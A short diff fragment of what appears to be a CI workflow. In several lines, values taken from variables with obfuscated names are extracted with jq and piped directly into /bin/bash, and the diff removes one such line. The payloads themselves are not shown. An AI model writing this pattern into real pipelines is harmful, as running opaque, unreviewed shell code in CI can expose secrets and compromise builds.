@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$gtejg580" | jq -r .gjmgp81 | /bin/bash
           echo $r7 | jq -r .cw243 | /bin/bash
           echo $gz53 | jq -r .fo4275 | /bin/bash
-          echo $zgkmp97979 | jq -r .ftigg2 | /bin/bash
 
       - name: Persist results
         if: always()
